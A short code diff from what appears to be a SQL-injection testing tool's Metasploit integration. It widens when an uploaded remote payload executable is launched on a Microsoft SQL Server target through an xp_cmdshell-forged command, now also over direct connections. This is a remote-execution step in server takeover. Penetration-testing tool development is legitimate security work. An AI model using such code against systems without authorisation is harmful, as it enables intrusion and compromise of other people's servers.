@@ -413,7 +413,7 @@ class Metasploit:
 
         cmd = "%s &" % self.exeFilePathRemote
 
-        if kb.dbms == "Microsoft SQL Server" and kb.stackedTest:
+        if kb.dbms == "Microsoft SQL Server" and (kb.stackedTest or conf.direct):
             cmd = self.xpCmdshellForgeCmd(cmd)
 
         self.execCmd(cmd, silent=True)
